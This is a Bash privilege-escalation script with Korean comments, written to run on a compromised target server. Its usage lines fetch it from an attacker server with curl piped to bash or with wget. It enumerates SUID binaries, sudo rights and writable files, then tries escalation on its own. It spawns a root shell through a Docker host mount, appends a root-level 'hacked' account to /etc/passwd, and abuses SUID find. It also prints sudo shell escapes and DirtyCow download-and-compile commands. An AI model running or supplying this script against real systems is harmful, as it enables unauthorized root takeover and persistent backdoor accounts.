#!/bin/bash
#
# 권한 상승 스크립트 (타겟 서버에서 실행)
# 이 스크립트는 타겟 서버에 업로드하거나 웹쉘을 통해 실행합니다
#
# 사용법:
#   curl http://공격자서버/privilege_escalation.sh | bash
#   또는
#   wget http://공격자서버/privilege_escalation.sh -O /tmp/priv.sh && bash /tmp/priv.sh
#

echo "============================================================"
echo "권한 상승 자동화 스크립트"
echo "============================================================"
echo ""

# 현재 사용자 확인
CURRENT_USER=$(whoami)
echo "[*] 현재 사용자: $CURRENT_USER"

if [ "$CURRENT_USER" = "root" ]; then
    echo "[+] 이미 root 권한입니다!"
    exit 0
fi

echo ""
echo "============================================================"
echo "1단계: 시스템 정보 수집"
echo "============================================================"

echo "[*] OS 정보:"
cat /etc/os-release 2>/dev/null | grep -E "^(NAME|VERSION)=" || uname -a

echo ""
echo "[*] 커널 버전:"
uname -r

echo ""
echo "[*] 현재 사용자 그룹:"
groups

echo ""
echo "============================================================"
echo "2단계: 권한 상승 벡터 검색"
echo "============================================================"

# SUID 바이너리 검색
echo ""
echo "[*] SUID 바이너리 검색..."
SUID_BINARIES=$(find / -perm -4000 -type f 2>/dev/null)
echo "$SUID_BINARIES"

# 흥미로운 SUID 바이너리 체크
INTERESTING_SUID=(
    "/usr/bin/find"
    "/usr/bin/vim"
    "/usr/bin/nano"
    "/usr/bin/cp"
    "/usr/bin/mv"
    "/usr/bin/tar"
    "/usr/bin/zip"
    "/usr/bin/unzip"
    "/usr/bin/awk"
    "/usr/bin/less"
    "/usr/bin/more"
    "/usr/bin/python"
    "/usr/bin/python2"
    "/usr/bin/python3"
    "/usr/bin/perl"
    "/usr/bin/ruby"
    "/usr/bin/php"
    "/usr/bin/gcc"
    "/usr/bin/bash"
    "/usr/bin/sh"
)

echo ""
echo "[*] 흥미로운 SUID 바이너리 확인:"
for binary in "${INTERESTING_SUID[@]}"; do
    if echo "$SUID_BINARIES" | grep -q "^$binary$"; then
        echo "    [!] 발견: $binary"
    fi
done

# sudo 권한 확인
echo ""
echo "[*] sudo 권한 확인:"
SUDO_LIST=$(sudo -l 2>/dev/null)
if [ $? -eq 0 ]; then
    echo "$SUDO_LIST"
else
    echo "    sudo 사용 불가 또는 비밀번호 필요"
fi

# Writable files
echo ""
echo "[*] /etc/passwd 쓰기 권한:"
if [ -w /etc/passwd ]; then
    echo "    [!] /etc/passwd에 쓰기 권한 있음!"
else
    echo "    쓰기 권한 없음"
fi

# Cron jobs
echo ""
echo "[*] Cron jobs 확인:"
cat /etc/crontab 2>/dev/null || echo "    /etc/crontab 읽기 불가"
ls -la /etc/cron.d/ 2>/dev/null | grep -v "^total" || echo "    /etc/cron.d/ 접근 불가"

echo ""
echo "============================================================"
echo "3단계: 자동 권한 상승 시도"
echo "============================================================"

# 방법 1: Docker 그룹 확인
if groups | grep -q docker; then
    echo ""
    echo "[!] Docker 그룹 멤버십 발견!"
    echo "[*] Docker를 이용한 권한 상승 시도..."

    if command -v docker &> /dev/null; then
        echo "[+] Docker 사용 가능. 권한 상승 실행..."
        docker run -v /:/mnt --rm -it alpine chroot /mnt sh -c "echo '[+] Root shell 획득!'; /bin/bash"
        exit 0
    fi
fi

# 방법 2: /etc/passwd 쓰기 가능
if [ -w /etc/passwd ]; then
    echo ""
    echo "[!] /etc/passwd 쓰기 가능!"
    echo "[*] 새 root 사용자 추가 중..."

    # 백업
    cp /etc/passwd /tmp/passwd.bak

    # 새 root 사용자 추가 (비밀번호: hacked)
    echo 'hacked:$1$hacked$XjdKNyiHH8v2E4mQC5K9M0:0:0:root:/root:/bin/bash' >> /etc/passwd

    echo "[+] 새 사용자 'hacked' 추가 완료 (비밀번호: hacked)"
    echo "[*] 다음 명령으로 로그인:"
    echo "    su hacked"
    exit 0
fi

# 방법 3: SUID find 활용
if echo "$SUID_BINARIES" | grep -q "^/usr/bin/find$"; then
    echo ""
    echo "[!] SUID find 발견!"
    echo "[*] find를 이용한 권한 상승..."

    /usr/bin/find /etc/passwd -exec whoami \; 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] find로 명령 실행 가능!"
        echo "[*] Root shell 실행:"
        /usr/bin/find /etc/passwd -exec /bin/bash -p \;
        exit 0
    fi
fi

# 방법 4: Sudo NOPASSWD 확인
if echo "$SUDO_LIST" | grep -q "NOPASSWD"; then
    echo ""
    echo "[!] NOPASSWD sudo 권한 발견!"
    echo "$SUDO_LIST" | grep "NOPASSWD"

    # 일반적인 sudo 명령들 시도
    SUDO_COMMANDS=(
        "/usr/bin/vim"
        "/usr/bin/nano"
        "/usr/bin/less"
        "/usr/bin/find"
        "/usr/bin/python"
        "/usr/bin/python3"
    )

    for cmd in "${SUDO_COMMANDS[@]}"; do
        if echo "$SUDO_LIST" | grep -q "$cmd"; then
            echo "[*] $cmd에 sudo 권한 있음"
            case "$cmd" in
                *vim|*nano)
                    echo "    sudo $cmd -c ':!/bin/bash' /dev/null"
                    ;;
                *less)
                    echo "    sudo $cmd /etc/profile"
                    echo "    (그 후 !bash 입력)"
                    ;;
                *python*)
                    echo "    sudo $cmd -c 'import os; os.system(\"/bin/bash\")'"
                    ;;
                *find)
                    echo "    sudo $cmd /etc/passwd -exec /bin/bash \\;"
                    ;;
            esac
        fi
    done
fi

# 방법 5: Kernel Exploit 확인
echo ""
echo "[*] 커널 익스플로잇 확인..."
KERNEL_VERSION=$(uname -r)
echo "    커널 버전: $KERNEL_VERSION"

# 알려진 취약한 커널
case "$KERNEL_VERSION" in
    2.6.*)
        echo "    [!] 오래된 커널 - DirtyCow(CVE-2016-5195) 가능"
        echo "    wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c"
        echo "    gcc -pthread dirty.c -o dirty -lcrypt"
        echo "    ./dirty"
        ;;
    3.*)
        echo "    [!] 중간 커널 - 다양한 익스플로잇 가능"
        ;;
    4.[0-9].*|4.1[0-3].*)
        echo "    [!] Ubuntu 16.04/18.04 - CVE-2017-16995 또는 CVE-2021-3493"
        ;;
    *)
        echo "    최신 커널 - 공개 익스플로잇 어려움"
        ;;
esac

# 방법 6: Systemd service 확인
echo ""
echo "[*] Systemd service 파일 쓰기 권한 확인..."
WRITABLE_SERVICES=$(find /etc/systemd/system/ -writable 2>/dev/null)
if [ -n "$WRITABLE_SERVICES" ]; then
    echo "[!] 쓰기 가능한 service 파일 발견:"
    echo "$WRITABLE_SERVICES"
fi

echo ""
echo "============================================================"
echo "권한 상승 스크립트 완료"
echo "============================================================"
echo ""
echo "[*] 자동 권한 상승 실패 - 수동 확인 필요"
echo ""
echo "다음 단계:"
echo "  1. LinPEAS 실행: wget linpeas.sh && bash linpeas.sh"
echo "  2. GTFOBins 확인: https://gtfobins.github.io/"
echo "  3. Kernel exploit 검색"
echo "  4. 설정 파일 확인 (비밀번호, API 키 등)"
echo ""
